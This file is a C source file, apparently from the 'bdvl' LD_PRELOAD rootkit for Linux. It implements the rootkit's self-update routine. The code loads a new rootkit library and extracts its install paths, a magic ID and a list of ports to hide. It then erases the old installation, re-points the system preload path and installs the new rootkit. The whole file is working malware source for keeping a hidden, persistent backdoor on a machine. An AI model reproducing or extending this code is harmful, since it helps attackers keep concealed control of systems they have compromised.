char **fetch_new_settings(const char *sopath, new_hideports *newhp){
    locate_dlsym();

    char **ret = calloc(4, sizeof(char*));
    if(!ret){
        xperror(CALLOC);
        return NULL;
    }

    void *handle = dlopen(sopath, RTLD_LAZY);
    if(!handle){
        printf("%s\n", dlerror());
        free(ret);
        return NULL;
    }

    void (*ptr)(void) = o_dlsym(handle, "imgay");
    if(!ptr){
        printf("%s\n", dlerror());
        dlclose(handle);
        free(ret);
        return NULL;
    }

    int filedes[2];
    char buffer[2048];
    memset(buffer, 0, sizeof(buffer));

    if(pipe(filedes) < 0){
        xperror(PIPE);
        dlclose(handle);
        free(ret);
        return NULL;
    }

    pid_t pid = fork();
    if(pid < 0){
        xperror(FORK);
        dlclose(handle);
        free(ret);
        return NULL;
    }else if(pid == 0){
        while(dup2(filedes[1], STDOUT_FILENO) < 0 && errno == EINTR);
        close(filedes[1]);
        close(filedes[0]);
        ptr();
        exit(0);
    }
    close(filedes[1]);

    printf("Waiting...\n");
    sleep(3);
    hook(CREAD);
    ssize_t count = (ssize_t)call(CREAD, filedes[0], buffer, sizeof(buffer)-1);
    wait(NULL);
    close(filedes[0]);
    dlclose(handle);

    char *bufdup;
    if(!count || (bufdup = strdup(buffer)) == NULL){
        if(count)
            xperror(STRDUP);
        free(ret);
        return NULL;
    }

    u_int i = 0;
    char *buftok = strtok(bufdup, "\n");
    while(buftok != NULL && i < 5 && ret != NULL){
        if(i < 4){
            /* simple strings */
            ret[i] = strdup(buftok);
            if(!ret[i]){
                xperror(STRDUP);
                if(i != 0)
                    for(u_int j = 0; j < i; j++)
                        clean(ret[j]);
                free(ret);
                return NULL;
            }
            buftok = strtok(NULL, "\n");
        }else{
            /* we are on the last bit of output: hideports. */

            char *toktok = strtok(buftok, ":"); // first get the amount of hideports in the output.
            const size_t nhideports = (size_t)atoi(toktok);
            // allocate necessary memory.
            if((newhp->hideports = calloc(nhideports, sizeof(u_short))) == NULL){
                xperror(CALLOC);
                for(u_int j = 0; j < i; j++)
                    clean(ret[j]);
                free(ret);
                return NULL;
            }

            // strtok for each port. atoi results into newhp->hideports.
            toktok = strtok(NULL, ", ");
            newhp->nhideports = 0;
            while(toktok != NULL){
                const u_short tokportd = (u_short)atoi(toktok);
                if(!tokportd) continue;
                newhp->hideports[newhp->nhideports++] = tokportd;
                toktok = strtok(NULL, ", ");
            }
        }
        
        ++i;
    }
    clean(bufdup);

    return ret;
}

void bdvupdate(char *const argv[]){
    if(!reinitmvbc()){
        xperror(REINITMVBC);
        exit(0);
    }

    /* point targetso to a valid bdvl.so.$platform in argv. if targetso is still NULL (nothing valid or errors in argv) then die. */
    char *targetso = NULL;
    for(u_int i = 2; argv[i] != NULL && !targetso; i++)
        if(strstr(argv[i], ".so."))
            targetso = argv[i];
    if(targetso == NULL){
        bxprintlist(updateusgmsg);
        exit(0);
    }

    bxprintlist(updatemsg);
    getchar();  /* let's go! */

    /* read important settings from target bdvl.so */
    new_hideports newhp;
    char **values = fetch_new_settings(targetso, &newhp);
    if(!values) exit(0);

    /* got what we need? */
    char *installdir  = values[0],
         *preloadpath = values[1],
         *bdvlso      = values[2];
    id_t magicid      = (id_t)atoi(values[3]);

    /* uninstall current bdvl. */
    u_short inhome = 0;
    char *cwd;
    if((cwd = getcwd(NULL, 0)) != NULL){   /* don't eradicate homedir when trying to install from it... */
        if(strncmp(mvbc->homedir, cwd, strlen(mvbc->homedir)) != 0)
            eradicatedir(mvbc->homedir);
        else inhome=1;
        clean(cwd);
    }else eradicatedir(mvbc->homedir); /* just eradicate it now i guess */
    doiadir(mvbc->installdir, 0);
    eradicatedir(mvbc->installdir);
    rmbdvpaths(mvbc);

    /* rehome preloadpath. */
    ldpatch(mvbc->preloadpath, preloadpath);

    /* copy new core settings into current bdvcfg_t. */
    writeover(mvbc->installdir, installdir);
    writeover(mvbc->preloadpath, preloadpath);
    writeover(mvbc->bdvlso, bdvlso);
    mvbc->magicid = magicid;

    /* copy new hideports into current. */
    mvbc->portcount = newhp.nhideports;
    for(u_int i = 0; i < newhp.nhideports; i++){
        mvbc->hideports[i] = newhp.hideports[i];
        newhp.hideports[i] = 0;
    }
    free(newhp.hideports); // this needs freeing now.
    newhp.nhideports = 0;

    /* done with this. */
    for(u_int i = 0; i < 4; i++)
        clean(values[i]);
    free(values);

    /* install new bdvl. */
    bdvinstall(argv, mvbc, 1);

    if(inhome)
        eradicatedir(mvbc->homedir);
    bree(mvbc);
    if(xrm(BDVL_CONFIG) < 0)
        xperror(RM);

    bxprintf(SUCCESS_STRING, 0);
}